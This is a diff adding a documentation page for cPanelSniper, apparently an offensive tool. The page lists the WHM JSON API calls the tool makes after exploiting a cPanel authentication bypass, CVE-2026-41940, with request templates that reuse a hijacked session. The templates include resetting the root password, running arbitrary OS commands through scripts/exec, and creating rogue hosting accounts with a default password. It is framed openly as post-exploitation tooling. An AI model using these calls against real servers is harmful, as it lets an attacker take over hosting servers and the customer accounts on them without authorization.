@@ -1,0 +1,144 @@
+---
+title: "WHM JSON API Endpoints Used by cPanelSniper"
+description: "Reference for all WHM JSON API endpoints that cPanelSniper calls post-exploitation, including request format, parameters, and response shapes."
+---
+
+After a successful CVE-2026-41940 bypass, cPanelSniper uses the WHM JSON API to perform post-exploitation actions. All requests use the authenticated session token and `whostmgrsession` cookie obtained during the exploit chain. This page documents each endpoint called by cPanelSniper.
+
+## Request format
+
+All WHM API calls follow this pattern:
+
+```
+GET /{cpsess_token}/json-api/{function}?api.version=1&{params}
+Host: {canonical_hostname}:{port}
+Cookie: whostmgrsession={session_base}
+```
+
+Responses are JSON objects. A successful call returns HTTP 200 with result data.
+
+## Endpoints
+
+### version
+
+Returns the installed cPanel & WHM version. Used in Stage 4 to confirm a successful auth bypass.
+
+```http
+GET /{token}/json-api/version?api.version=1
+```
+
+**Response fields:**
+
+<ResponseField name="version" type="string">
+  The installed cPanel & WHM version string, e.g. `11.130.0.6`
+</ResponseField>
+<ResponseField name="result" type="integer">
+  `1` on success
+</ResponseField>
+
+---
+
+### listaccts
+
+Lists all cPanel accounts hosted on the server. Used by `--action list`.
+
+```http
+GET /{token}/json-api/listaccts?api.version=1&search=&searchtype=user
+```
+
+**Response:** `data.acct` array with `user`, `domain`, and `email` fields per account.
+
+---
+
+### gethostname
+
+Returns the server's configured hostname. Used by `--action info` and the `hostname` shell command.
+
+```http
+GET /{token}/json-api/gethostname?api.version=1
+```
+
+---
+
+### loadavg
+
+Returns the server's 1, 5, and 15 minute load averages. Used by `--action info`.
+
+```http
+GET /{token}/json-api/loadavg?api.version=1
+```
+
+---
+
+### getdiskinfo
+
+Returns disk usage information. Used by `--action info`.
+
+```http
+GET /{token}/json-api/getdiskinfo?api.version=1
+```
+
+---
+
+### getmysqlhost
+
+Returns the configured MySQL host. Used by `--action info`.
+
+```http
+GET /{token}/json-api/getmysqlhost?api.version=1
+```
+
+---
+
+### passwd
+
+Changes a cPanel user's password. Used by `--action passwd`.
+
+```http
+GET /{token}/json-api/passwd?api.version=1&user=root&password={newpass}
+```
+
+<ParamField path="user" type="string" required>
+  The username whose password to change. cPanelSniper targets `root`.
+</ParamField>
+<ParamField path="password" type="string" required>
+  The new password value.
+</ParamField>
+
+---
+
+### scripts/exec
+
+Executes an OS command on the server. Used by `--action cmd` and `--action exec`.
+
+```http
+GET /{token}/json-api/scripts/exec?api.version=1&command={cmd}
+```
+
+<ParamField path="command" type="string" required>
+  The OS command to execute. May be blocked on license-restricted installs.
+</ParamField>
+
+<Note>
+  If `scripts/exec` is blocked by licensing, cPanelSniper automatically falls back to alternative execution methods via the cPanel Fileman API.
+</Note>
+
+---
+
+### createacct
+
+Creates a new cPanel hosting account. Used by `--action adduser`.
+
+```http
+GET /{token}/json-api/createacct?api.version=1&username={user}&domain={domain}&password={pass}&plan=default
+```
+
+<ParamField path="username" type="string" required>
+  The new account username. Set via `--new-user`.
+</ParamField>
+<ParamField path="domain" type="string" required>
+  The primary domain for the new account. Set via `--new-domain`.
+</ParamField>
+<ParamField path="password" type="string" required>
+  Initial password. Defaults to `TempPass2026!` if not specified with `--passwd`.
+</ParamField>
